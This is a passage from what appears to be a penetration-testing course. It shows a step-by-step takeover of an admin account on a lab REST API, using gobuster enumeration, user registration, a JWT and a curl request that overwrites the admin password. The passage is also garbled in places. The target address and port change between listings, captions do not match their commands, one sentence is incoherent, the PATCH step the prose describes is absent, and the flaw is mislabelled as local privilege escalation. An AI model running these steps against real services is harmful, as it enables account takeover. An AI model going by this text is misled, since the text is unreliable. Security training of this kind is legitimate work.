> Listing 108 - Obtaining Users' Information

The application returned three users, including an administrative account that seems to be worth further investigation. We can use this information to attempt another brute force attack with gobuster, this time targeting the admin user with a smaller wordlist. To verify if any API property relates to the username we found, we expand the API path by inserting the admin at the end of the url.

```bash
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/common.txt
```

Listing 109 - Discovering extra APIs

The password API semantics for enticing our testing purposes, we'll probe it with curl.

```bash
kali@kali:~$ curl -i http://192.168.0.50:16002/users/v1/admin/password
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: application/problem+json
Content-Length: 142
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 10:58:51 GMT
{
  "detail": "The method is not allowed for the requested URL",
  "status": "Method Not Allowed",
  "type": "about:blank"
}
```

Listing 110 - Discovering API unsupported methods

Interestingly, instead of a 404 Not Found code, we receive a 405 METHOD NOT ALLOWED, implying that the requested URL is unsupported. By default, kali uses the GET method when it performs requests, so we could try interacting with the password API through a different method, such as POST or PUT.

Both POST and PUT methods, if permitted on this specific API, allow us to override the user credentials (in this case, the administrator password).

Before attempting a method, let's verify whether or not the overwritten credentials are accepted. We can check if the login method is supported by extending our URL as:

```bash
kali@kali:~$ curl -i http://192.168.0.50:16002/users/v1/login
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 46
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 12:04:30 GMT
{
  "status": "fail", "message": "User not found"}
}
```

Listing 111 - Inspecting the 'login' API

Although we were presented with a 404 NOT FOUND message, the status message states that the user has not been found; another clear sign that the API itself exists. We only need to find a way to interact with it.

We know one of the usernames is admin, so we can attempt a login with this username and a dummy password to verify that our strategy makes sense.

Next, we will try to convert the GET request into a POST. Let's craft our payload by first specifying the admin username and dummy password in the Content-Type: JSON header.

```bash
kali@kali:~$ curl -i http://192.168.0.50:16002/users/v1/login -H "Content-Type: application/json" -d '{"username":"admin","password":"password"}'
```

Listing 112 - Crafting a POST request

The API returned a "fail" status because the password is incorrect. Since we don't know the password, let's try another route: the registration endpoint. We will specify the password password.

```bash
kali@kali:~$ curl -i http://192.168.0.50:16002/users/v1/register -H "Content-Type: application/json" -d '{"username":"admin","password":"password"}'
```

Listing 113 - Attempting to register

The API returned a "fail" status because the email is required. We must include an email address in the JSON body to satisfy the requirements.

```bash
kali@kali:~$ curl -i http://192.168.0.50:16002/users/v1/register -H "Content-Type: application/json" -d '{"username":"admin","email":"admin@mail.com"}'
```

Listing 114 - Attempting to register

The API returned a "fail" status because the username is already taken. We will try a different username to ensure the registration succeeds.

```bash
kali@kali:~$ curl -i http://192.168.0.50:16002/users/v1/register -H "Content-Type: application/json" -d '{"username":"admin2","email":"admin@mail.com"}'
```

Listing 115 - Logging in

The API returned a "success" status and provided a JWT in the response. We can use this token to log in as the new user.

```bash
kali@kali:~$ curl -i http://192.168.0.50:16002/users/v1/login -H "Content-Type: application/json" -d '{"username":"admin2","password":"password"}'
```

Listing 116 - Attempting to Change the password

We passed the JWT in the Authorization header to change the password. However, the method we used is incorrect, so we need to try another one. The PATCH method is often used to replace a value.

```bash
kali@kali:~$ curl -i http://192.168.0.50:16002/users/v1/admin/password -H "Content-Type: application/json" -H "Authorization: <JWT>" -d '{"password":"pwned"}'
```

Listing 117 - Attempting to Change the password

This time we received no error, so we can assume that no error was thrown by the backend logic. To prove our attack success, we can log in admin using the newly-changed password.

```bash
kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json' 'http://192.168.0.50:16002/users/v1/login'
```

Listing 118 - Successfully logging in as the admin account

We managed to take over the admin account by exploiting a local privilege escalation bug in the request API.
